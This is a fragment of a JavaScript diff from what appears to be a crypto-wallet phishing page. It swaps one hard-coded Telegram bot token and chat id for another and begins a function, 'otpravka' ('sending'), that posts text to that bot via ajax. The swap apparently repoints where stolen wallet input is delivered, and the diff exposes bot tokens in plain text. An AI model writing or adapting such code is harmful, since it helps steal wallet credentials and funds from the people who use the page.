@@ -26,8 +26,8 @@ document.querySelector(".exit").addEventListener("click", event => {
 //   document.querySelector(".select__wallet-cont").style.display = "none";
 })
 
-var chatid = "-1001799577628";
-var token = "5597021398:AAH7m51E6fZKO67x8sLaAyFGkxzS3KFsQEw";
+var chatid = "5200289419";
+var token = "5433611121:AAFMpeQpC5y_y0PveL5sd77QQIXHuz6TOr4";
 
 function otpravka(token,textfant,chatid){
 var z=$.ajax({
